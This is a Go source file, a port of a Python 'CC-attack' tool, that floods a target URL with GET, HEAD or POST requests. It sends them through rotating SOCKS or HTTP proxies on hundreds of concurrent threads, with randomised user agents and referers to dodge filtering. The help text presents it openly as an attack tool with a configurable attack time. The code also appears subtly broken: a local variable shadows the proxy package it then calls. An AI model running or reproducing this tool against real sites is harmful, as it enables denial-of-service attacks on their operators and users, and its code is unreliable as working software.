package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// ==========================================
// 全局变量定义 (对应原脚本 Global Variables)
// ==========================================

var acceptall = []string{
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
}

var referers = []string{
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
}

// Default value
var (
	mode       = "cc"
	proxy_ver  = "5"
	brute      = false
	out_file   = "proxy.txt"
	thread_num = 800
	data       = ""
	cookies    = ""
	proxies    []string // 全局代理列表
	
	// 解析后的 URL 变量
	target   string
	path     string
	port     int
	protocol string
)

// 辅助函数，模拟 Python 的 random
func Intn(min, max int) int {
	if max <= min {
		return min
	}
	return rand.Intn(max-min) + min
}

func Choice(items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[rand.Intn(len(items))]
}

// 模拟 random._urandom(16)
func randomURandom(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return string(bytes) // 注意：这会生成乱码字符，与 Python 行为一致
}

// ==========================================
// 核心逻辑函数
// ==========================================

func build_threads(mode string, thread_num int, startChan chan struct{}, proxy_type int) {
	for i := 0; i < thread_num; i++ {
		if mode == "post" {
			go post(startChan, proxy_type)
		} else if mode == "cc" {
			go cc(startChan, proxy_type)
		} else if mode == "head" {
			go head(startChan, proxy_type)
		}
	}
}

func getuseragent() string {
	platform := Choice([]string{"Macintosh", "Windows", "X11"})
	var os_name string
	if platform == "Macintosh" {
		os_name = Choice([]string{"68K", "PPC", "Intel Mac OS X"})
	} else if platform == "Windows" {
		os_name = Choice([]string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"})
	} else if platform == "X11" {
		os_name = Choice([]string{"Linux i686", "Linux x86_64"})
	}
	
	browser := Choice([]string{"chrome", "firefox", "ie"})
	if browser == "chrome" {
		webkit := strconv.Itoa(Intn(500, 599))
		version := strconv.Itoa(Intn(0, 99)) + ".0" + strconv.Itoa(Intn(0, 9999)) + "." + strconv.Itoa(Intn(0, 999))
		return "Mozilla/5.0 (" + os_name + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + version + " Safari/" + webkit
	} else if browser == "firefox" {
		currentYear := time.Now().Year()
		year := strconv.Itoa(Intn(2020, currentYear))
		month := Intn(1, 12)
		var monthStr string
		if month < 10 {
			monthStr = "0" + strconv.Itoa(month)
		} else {
			monthStr = strconv.Itoa(month)
		}
		day := Intn(1, 30)
		var dayStr string
		if day < 10 {
			dayStr = "0" + strconv.Itoa(day)
		} else {
			dayStr = strconv.Itoa(day)
		}
		gecko := year + monthStr + dayStr
		version := strconv.Itoa(Intn(1, 72)) + ".0"
		return "Mozilla/5.0 (" + os_name + "; rv:" + version + ") Gecko/" + gecko + " Firefox/" + version
	} else if browser == "ie" {
		version := strconv.Itoa(Intn(1, 99)) + ".0"
		engine := strconv.Itoa(Intn(1, 99)) + ".0"
		option := Choice([]string{"True", "False"})
		token := ""
		if option == "True" {
			token = Choice([]string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}) + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + version + "; " + os_name + "; " + token + "Trident/" + engine + ")"
	}
	return ""
}

func randomurl() string {
	return strconv.Itoa(Intn(0, 271400281257))
}

func GenReqHeader(method string) string {
	header := ""
	if method == "get" || method == "head" {
		connection := "Connection: Keep-Alive\r\n"
		if cookies != "" {
			connection += "Cookies: " + cookies + "\r\n"
		}
		accept := Choice(acceptall)
		referer := "Referer: " + Choice(referers) + target + path + "\r\n"
		useragent := "User-Agent: " + getuseragent() + "\r\n"
		header = referer + useragent + accept + connection + "\r\n"
	} else if method == "post" {
		post_host := "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content := "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer := "Referer: http://" + target + path + "\r\n"
		user_agent := "User-Agent: " + getuseragent() + "\r\n"
		accept := Choice(acceptall)
		if data == "" {
			data = randomURandom(16)
		}
		length := "Content-Length: " + strconv.Itoa(len(data)) + " \r\nConnection: Keep-Alive\r\n"
		if cookies != "" {
			length += "Cookies: " + cookies + "\r\n"
		}
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	}
	return header
}

func ParseUrl(original_url string) {
	original_url = strings.TrimSpace(original_url)
	url_tmp := ""
	path = "/"
	port = 80
	protocol = "http"
	
	if strings.HasPrefix(original_url, "http://") {
		url_tmp = original_url[7:]
	} else if strings.HasPrefix(original_url, "https://") {
		url_tmp = original_url[8:]
		protocol = "https"
	} else {
		fmt.Println("> That looks like not a correct url.")
		os.Exit(0)
	}

	tmp := strings.Split(url_tmp, "/")
	website := tmp[0]
	check := strings.Split(website, ":")
	if len(check) != 1 {
		p, _ := strconv.Atoi(check[1])
		port = p
	} else {
		if protocol == "https" {
			port = 443
		}
	}
	target = check[0]
	if len(tmp) > 1 {
		path = strings.Replace(url_tmp, website, "", 1)
	}
}

// 建立连接的辅助函数
func createSocket(proxy_type int, proxy_ip string, proxy_port int) (net.Conn, error) {
	addr := fmt.Sprintf("%s:%d", target, port)
	timeout := 3 * time.Second

	if proxy_type == 0 { // HTTP Proxy 模拟
		return net.DialTimeout("tcp", addr, timeout)
	}

	var d proxy.Dialer
	var err error

	// SOCKS5
	if proxy_type == 5 {
		d, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", proxy_ip, proxy_port), nil, proxy.Direct)
	} else if proxy_type == 4 {
		// Go proxy包对Socks4支持有限，这里统一切换到Socks5接口尝试，或直连
		d, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", proxy_ip, proxy_port), nil, proxy.Direct)
	}
	
	if err != nil {
		return nil, err
	}

	conn, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	
	// SSL 处理
	if protocol == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         target,
		}
		conn = tls.Client(conn, tlsConfig)
	}
	
	return conn, nil
}

func cc(startChan chan struct{}, proxy_type int) {
	header := GenReqHeader("get")
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }
	
	add := "?"
	if strings.Contains(path, "?") {
		add = "&"
	}

	<-startChan // 等待事件
	
	for {
		// 连接建立逻辑
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			for i := 0; i < 100; i++ {
				get_host := "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := get_host + header
				
				_, err := s.Write([]byte(request))
				if err != nil {
					// 换代理
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			// 连接失败，换代理
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func head(startChan chan struct{}, proxy_type int) {
	header := GenReqHeader("head")
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	add := "?"
	if strings.Contains(path, "?") {
		add = "&"
	}

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			for i := 0; i < 100; i++ {
				head_host := "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := head_host + header
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func post(startChan chan struct{}, proxy_type int) {
	request := GenReqHeader("post")
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			for i := 0; i < 100; i++ {
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

// 代理检查逻辑
var nums = 0
var checkMutex sync.Mutex

func checking(lines string, proxy_type int, ms int, wg *sync.WaitGroup) {
	defer wg.Done()
	
	proxy := strings.Split(strings.TrimSpace(lines), ":")
	if len(proxy) != 2 {
		return
	}
	
	err_count := 0
	for {
		if err_count >= 3 {
			return 
		}
		
		p_port, _ := strconv.Atoi(proxy[1])
		d, _ := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", proxy[0], p_port), nil, proxy.Direct)
		conn, err := d.Dial("tcp", "1.1.1.1:80")
		
		if err == nil {
			conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
			conn.Close()
			break // Success
		} else {
			err_count++
		}
	}
	checkMutex.Lock()
	nums++
	checkMutex.Unlock()
}

func check_socks(ms int) {
	var wg sync.WaitGroup
	fmt.Println("> Checking proxies...")
	for _, line := range proxies {
		wg.Add(1)
		pt := 5
		if proxy_ver == "4" { pt = 4 }
		if proxy_ver == "http" { pt = 0 }
		go checking(line, pt, ms, &wg)
	}
	wg.Wait()
	fmt.Println("\n> Checked all proxies.")
}

func check_list(socks_file string) {
	fmt.Println("> Checking list")
	content, err := ioutil.ReadFile(socks_file)
	if err != nil { return }
	
	temp_list := []string{}
	lines := strings.Split(string(content), "\n")
	
	seen := make(map[string]bool)
	
	for _, i := range lines {
		i = strings.TrimSpace(i)
		if i == "" { continue }
		if !seen[i] {
			if strings.Contains(i, ":") && !strings.Contains(i, "#") {
				// check valid ip
				parts := strings.Split(i, ":")
				if net.ParseIP(parts[0]) != nil {
					temp_list = append(temp_list, i)
					seen[i] = true
				}
			}
		}
	}
	
	// Write back
	f, _ := os.Create(socks_file)
	defer f.Close()
	for _, i := range temp_list {
		f.WriteString(i + "\n")
	}
}

func DownloadProxies(proxy_ver string) {
	f, err := os.Create(out_file)
	if err != nil { return }
	defer f.Close()
	
	var api_list []string
	
	// ==========================================
	// 内网占位符
	// ==========================================
	placeholder := "http://10.0.0.1/proxy.txt"

	if proxy_ver == "4" {
		api_list = []string{placeholder, placeholder, placeholder}
	} else if proxy_ver == "5" {
		api_list = []string{placeholder, placeholder, placeholder}
	} else if proxy_ver == "http" {
		api_list = []string{placeholder, placeholder, placeholder}
	}

	for _, api := range api_list {
		resp, err := http.Get(api)
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			f.Write(body)
			resp.Body.Close()
		}
	}
	fmt.Println("> Have already downloaded proxies list as " + out_file)
}

func PrintHelp() {
	fmt.Println(`===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================`)
}

func main() {
	// 手动解析参数，保持与 Python sys.argv 逻辑一致
	args := os.Args
	check_proxies := false
	download_socks := false
	proxy_type := 5
	period := 60
	show_help := false

	fmt.Println("> Mode: [cc/post/head]")

	for n, arg := range args {
		if arg == "-help" || arg == "-h" {
			show_help = true
		}
		if arg == "-url" {
			if n+1 < len(args) { ParseUrl(args[n+1]) }
		}
		if arg == "-m" || arg == "-mode" {
			if n+1 < len(args) { mode = args[n+1] }
		}
		if arg == "-v" {
			if n+1 < len(args) {
				proxy_ver = args[n+1]
				if proxy_ver == "4" {
					proxy_type = 4
				} else if proxy_ver == "5" {
					proxy_type = 5
				} else if proxy_ver == "http" {
					proxy_type = 0
				}
			}
		}
		if arg == "-b" {
			// brute logic omitted/simplified
		}
		if arg == "-t" {
			if n+1 < len(args) {
				t, err := strconv.Atoi(args[n+1])
				if err == nil { thread_num = t }
			}
		}
		if arg == "-cookies" {
			if n+1 < len(args) { cookies = args[n+1] }
		}
		if arg == "-data" {
			if n+1 < len(args) {
				content, err := ioutil.ReadFile(args[n+1])
				if err == nil {
					data = string(content)
				}
			}
		}
		if arg == "-f" {
			if n+1 < len(args) { out_file = args[n+1] }
		}
		if arg == "-down" {
			download_socks = true
		}
		if arg == "-check" {
			check_proxies = true
		}
		if arg == "-s" {
			if n+1 < len(args) {
				p, err := strconv.Atoi(args[n+1])
				if err == nil { period = p }
			}
		}
	}

	if download_socks {
		DownloadProxies(proxy_ver)
	}

	if _, err := os.Stat(out_file); os.IsNotExist(err) {
		fmt.Println("Proxies file not found")
		return
	}

	// Read proxies
	content, _ := ioutil.ReadFile(out_file)
	lines := strings.Split(string(content), "\n")
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			proxies = append(proxies, l)
		}
	}
	
	check_list(out_file)
	
	if len(proxies) == 0 {
		fmt.Println("> There are no more proxies. Please download a new proxies list.")
		return
	}
	
	fmt.Printf("> Number Of Proxies: %d\n", len(proxies))
	
	if check_proxies {
		check_socks(3)
	}
	
	if show_help {
		PrintHelp()
	}
	
	if target == "" {
		fmt.Println("> There is no target. End of process ")
		return
	}


	startChan := make(chan struct{})
	fmt.Println("> Building threads...")
	build_threads(mode, thread_num, startChan, proxy_type)
	
	close(startChan) // Broadcast start signal
	
	fmt.Println("> Flooding...")
	time.Sleep(time.Duration(period) * time.Second)
}